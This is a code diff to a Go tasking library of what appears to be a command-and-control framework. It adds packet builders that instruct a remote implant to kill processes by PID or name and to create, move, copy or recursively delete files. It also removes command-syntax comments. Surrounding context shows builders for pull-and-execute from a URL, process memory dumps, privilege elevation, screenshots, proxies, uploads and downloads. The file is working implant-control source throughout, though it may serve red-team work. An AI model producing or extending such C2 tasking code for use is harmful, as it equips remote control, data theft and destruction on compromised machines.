@@ -22,9 +22,6 @@ import (
 //      <none>
 //  Output:
 //      string // Working Dir
-//
-// C2 Client Command:
-//  pwd
 func Pwd() *com.Packet {
 	return &com.Packet{ID: MvPwd}
 }
@@ -39,9 +36,6 @@ func Pwd() *com.Packet {
 //      <none>
 //  Output:
 //      []string // Mount Paths List
-//
-// C2 Client Command:
-//  mounts
 func Mounts() *com.Packet {
 	return &com.Packet{ID: MvMounts}
 }
@@ -60,9 +54,6 @@ func Mounts() *com.Packet {
 //      <none>
 //  Output:
 //      Machine // Updated device details
-//
-// C2 Client Command:
-//  refresh
 func Refresh() *com.Packet {
 	return &com.Packet{ID: MvRefresh}
 }
@@ -80,9 +71,6 @@ func Refresh() *com.Packet {
 //      <none>
 //  Output:
 //      <none>
-//
-// C2 Client Command:
-//  rev2self
 func RevToSelf() *com.Packet {
 	return &com.Packet{ID: MvRevSelf}
 }
@@ -99,9 +87,6 @@ func RevToSelf() *com.Packet {
 //      <none>
 //  Output:
 //      []byte // Data
-//
-// C2 Client Command:
-//  screenshot
 func ScreenShot() *com.Packet {
 	return &com.Packet{ID: TvScreenShot}
 }
@@ -127,10 +112,6 @@ func ScreenShot() *com.Packet {
 //          uint64      // Size
 //          int64       // Modtime
 //      }
-//
-// C2 Client Command:
-//  ls [path]
-//  dir [path]
 func Ls(d string) *com.Packet {
 	n := &com.Packet{ID: MvList}
 	n.WriteString(d)
@@ -152,9 +133,6 @@ func Ls(d string) *com.Packet {
 //          uint32          // Parent Process ID
 //          string          // Process Image Name
 //      }
-//
-// C2 Client Command:
-//  ps
 func ProcessList() *com.Packet {
 	return &com.Packet{ID: TvProcList}
 }
@@ -175,12 +153,68 @@ func ProcessList() *com.Packet {
 //      string // Directory
 //  Output:
 //      <none>
-//
-// C2 Client Command:
-//  cd <path>
 func Cwd(d string) *com.Packet {
 	n := &com.Packet{ID: MvCwd}
 	n.WriteString(d)
+	return n
+}
+
+// Kill returns a process kill Packet. This can be used to instruct to send a
+// SIGKILL signal to the specified process by the specified Process ID.
+//
+// C2 Details:
+//  ID: TvSystemIO
+//
+//  Input:
+//      uint8  // IO Type
+//      uint32 // PID
+//  Output:
+//      uint8  // IO Type
+func Kill(p uint32) *com.Packet {
+	n := &com.Packet{ID: TvSystemIO}
+	n.WriteUint8(taskIoKill)
+	n.WriteUint32(p)
+	return n
+}
+
+// Touch returns a file touch Packet. This can be used to instruct to create the
+// specified file if it does not exist.
+//
+// The path may contain environment variables that will be resolved during
+// runtime.
+//
+// C2 Details:
+//  ID: TvSystemIO
+//
+//  Input:
+//      uint8  // IO Type
+//      string // Path
+//  Output:
+//      uint8  // IO Type
+func Touch(s string) *com.Packet {
+	n := &com.Packet{ID: TvSystemIO}
+	n.WriteUint8(taskIoTouch)
+	n.WriteString(s)
+	return n
+}
+
+// KillName returns a process kill Packet. This can be used to instruct to send
+// a SIGKILL signal all to the specified processes that have the specified name.
+//
+// NOTE: This kills all processes that share this name.
+//
+// C2 Details:
+//  ID: TvSystemIO
+//
+//  Input:
+//      uint8  // IO Type
+//      string // Process Name
+//  Output:
+//      uint8  // IO Type
+func KillName(s string) *com.Packet {
+	n := &com.Packet{ID: TvSystemIO}
+	n.WriteUint8(taskIoKillName)
+	n.WriteString(s)
 	return n
 }
 
@@ -200,9 +234,6 @@ func Cwd(d string) *com.Packet {
 //      bool   // Target is Directory
 //      int64  // Size
 //      []byte // Data
-//
-// C2 Client Command:
-//  download <src> [dest]
 func Download(src string) *com.Packet {
 	n := &com.Packet{ID: TvDownload}
 	n.WriteString(src)
@@ -219,12 +250,59 @@ func Download(src string) *com.Packet {
 //      string // New Process Name
 //  Output:
 //      <none>
-//
-// C2 Client Command:
-//  proc-name <name>
 func ProcessName(s string) *com.Packet {
 	n := &com.Packet{ID: TvRename}
 	n.WriteString(s)
+	return n
+}
+
+// Move returns a file move Packet. This can be used to instruct to move the
+// specified source file to the specified destination path.
+//
+// The source and destination paths may contain environment variables that will
+// be resolved during runtime.
+//
+// C2 Details:
+//  ID: TvSystemIO
+//
+//  Input:
+//      uint8  // IO Type
+//      string // Source
+//      string // Destination
+//  Output:
+//      uint8  // IO Type
+//      string // Expanded Destination Path
+//      uint64 // Byte Count Written
+func Move(src, dst string) *com.Packet {
+	n := &com.Packet{ID: TvSystemIO}
+	n.WriteUint8(taskIoMove)
+	n.WriteString(src)
+	n.WriteString(dst)
+	return n
+}
+
+// Copy returns a file copy Packet. This can be used to instruct to copy the
+// specified source file to the specified destination path.
+//
+// The source and destination paths may contain environment variables that will
+// be resolved during runtime.
+//
+// C2 Details:
+//  ID: TvSystemIO
+//
+//  Input:
+//      uint8  // IO Type
+//      string // Source
+//      string // Destination
+//  Output:
+//      uint8  // IO Type
+//      string // Expanded Destination Path
+//      uint64 // Byte Count Written
+func Copy(src, dst string) *com.Packet {
+	n := &com.Packet{ID: TvSystemIO}
+	n.WriteUint8(taskIoCopy)
+	n.WriteString(src)
+	n.WriteString(dst)
 	return n
 }
 
@@ -244,9 +322,6 @@ func ProcessName(s string) *com.Packet {
 //  Output:
 //      string // Expanded Destination Path
 //      uint64 // Byte Count Written
-//
-// C2 Client Command:
-//  pull <url> <dest>
 func Pull(url, path string) *com.Packet {
 	n := &com.Packet{ID: TvPull}
 	n.WriteString(url)
@@ -269,9 +344,6 @@ func Pull(url, path string) *com.Packet {
 //      bool   // Always set to true for this task.
 //  Output:
 //      <none>
-//
-// C2 Client Command:
-//  proxy_del <name>
 func ProxyRemove(name string) *com.Packet {
 	n := &com.Packet{ID: MvProxy}
 	n.WriteString(name)
@@ -298,9 +370,6 @@ func ProxyRemove(name string) *com.Packet {
 //      }
 //  Output:
 //      <none>
-//
-// C2 Client Command:
-//  elevate [target]
 func Elevate(f *filter.Filter) *com.Packet {
 	n := &com.Packet{ID: MvElevate}
 	f.MarshalStream(n)
@@ -323,9 +392,6 @@ func Elevate(f *filter.Filter) *com.Packet {
 //  Output:
 //      string // Expanded Destination Path
 //      uint64 // Byte Count Written
-//
-// C2 Client Command:
-//  upload <src> <dst>
 func Upload(dst string, b []byte) *com.Packet {
 	n := &com.Packet{ID: TvUpload}
 	n.WriteString(dst)
@@ -352,12 +418,36 @@ func Upload(dst string, b []byte) *com.Packet {
 //      }
 //  Output:
 //      []byte // Data
-//
-// C2 Client Command:
-//  dump <target>
 func ProcessDump(f *filter.Filter) *com.Packet {
 	n := &com.Packet{ID: TvProcDump}
 	f.MarshalStream(n)
+	return n
+}
+
+// Delete returns a file delete Packet. This can be used to instruct to delete
+// the specified file if it exists.
+//
+// Specify 'recurse' to True to delete a non-empty directory and all files in it.
+//
+// The path may contain environment variables that will be resolved during
+// runtime.
+//
+// C2 Details:
+//  ID: TvSystemIO
+//
+//  Input:
+//      uint8  // IO Type
+//      string // Path
+//  Output:
+//      uint8  // IO Type
+func Delete(s string, recurse bool) *com.Packet {
+	n := &com.Packet{ID: TvSystemIO}
+	if recurse {
+		n.WriteUint8(taskIoDeleteAll)
+	} else {
+		n.WriteUint8(taskIoDelete)
+	}
+	n.WriteString(s)
 	return n
 }
 
@@ -378,9 +468,6 @@ func ProcessDump(f *filter.Filter) *com.Packet {
 //      []byte // Proxy Profile
 //  Output:
 //      <none>
-//
-// C2 Client Command:
-//  proxy <name> <address> <profile>
 func Proxy(name, addr string, p []byte) *com.Packet {
 	n := &com.Packet{ID: MvProxy}
 	n.WriteString(name)
@@ -409,9 +496,6 @@ func Proxy(name, addr string, p []byte) *com.Packet {
 //  Output:
 //      string // Expanded Destination Path
 //      uint64 // Byte Count Written
-//
-// C2 Client Command:
-//  upload <src> <dst>
 func UploadFile(dst, src string) (*com.Packet, error) {
 	f, err := os.OpenFile(device.Expand(src), os.O_RDONLY, 0)
 	if err != nil {
@@ -438,9 +522,6 @@ func UploadFile(dst, src string) (*com.Packet, error) {
 //  Output:
 //      string // Expanded Destination Path
 //      uint64 // Byte Count Written
-//
-// C2 Client Command:
-//  upload <src> <dst>
 func UploadReader(dst string, r io.Reader) (*com.Packet, error) {
 	n := &com.Packet{ID: TvUpload}
 	n.WriteString(dst)
@@ -478,9 +559,6 @@ func UploadReader(dst string, r io.Reader) (*com.Packet, error) {
 //  Output:
 //      uint32          // PID
 //      int32           // Exit Code
-//
-// C2 Client Command:
-//  pull-exec <url> [wait]
 func PullExecute(url string, w bool, f *filter.Filter) *com.Packet {
 	n := &com.Packet{ID: TvPullExecute}
 	n.WriteString(url)
